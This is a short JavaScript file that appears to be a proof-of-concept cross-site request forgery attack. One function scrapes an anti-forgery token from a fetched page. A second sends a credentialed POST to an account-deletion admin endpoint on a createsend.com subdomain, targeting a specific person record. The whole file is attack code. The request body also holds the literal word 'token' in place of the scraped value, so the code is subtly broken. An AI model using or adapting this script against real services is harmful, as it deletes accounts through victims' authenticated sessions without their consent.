function readBody(xhr) {
    var data;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else {
        data = xhr.response;
    }
    var parser = new DOMParser();
    var resp = parser.parseFromString(data, "text/html");
    token = resp.getElementsByName('__RequestVerificationToken')[0].value; //grab first available token
    console.log('token: ' + token);
    csrf(token);
    return data;
}
function csrf(token)
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/here12.createsend.com\/admin\/account\/person\/delete", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
        xhr.withCredentials = true;
        var body = "__RequestVerificationToken=token&dbId=3&personId=264388";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
